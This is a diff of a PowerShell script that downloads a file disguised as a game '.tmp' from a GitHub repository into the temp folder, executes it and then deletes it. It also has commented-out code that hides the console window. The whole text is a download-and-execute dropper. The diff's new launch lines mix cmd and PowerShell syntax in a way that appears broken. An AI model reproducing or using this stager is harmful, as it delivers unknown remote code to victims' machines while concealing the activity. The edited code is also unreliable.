@@ -7,14 +7,12 @@ $ErrorActionPreference = "Stop"
 # $consolePtr = [Console.Window]::GetConsoleWindow()
 # [Console.Window]::ShowWindow($consolePtr, 0) # 0 = скрыть
 
-$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/e1090ed9-44f0-4a4a-b228-e41aa7662bd4.tmp"
-$TempExe = Join-Path ([IO.Path]::GetTempPath()) "e1090ed9-44f0-4a4a-b228-e41aa7662bd4.tmp"
+$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/globalgamemanage.tmp"
+$TempExe = Join-Path ([IO.Path]::GetTempPath()) "globalgamemanage.tmp"
 
 Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing
-
-$TempFile = Join-Path $env:TEMP "e1090ed9-44f0-4a4a-b228-e41aa7662bd4.tmp"
-$proc = [System.Diagnostics.Process]::Start($TempFile)
-$proc.WaitForExit()
-
+cmd
+%TEMP%/e1090ed9-44f0-4a4a-b228-e41aa7662bd4.tmp
+powershell
 
 Remove-Item $TempExe -Force -ErrorAction SilentlyContinue
